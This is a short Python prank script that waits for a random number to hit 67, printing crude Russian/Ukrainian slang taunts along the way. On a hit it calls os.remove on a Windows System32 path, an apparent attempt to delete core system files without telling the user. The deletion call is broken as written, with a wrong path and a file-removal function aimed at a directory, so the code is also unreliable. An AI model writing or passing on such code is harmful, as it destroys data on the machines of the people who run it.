import random
import time
import os 

ok = 0

while ok != 67:
  ok = random.randint(1, 100)
  if ok == 67:
      print("ахахах 67 гавно ✅")
      time.sleep(10)
      os.remove("C:\System32")
  print("ща ще не 67")
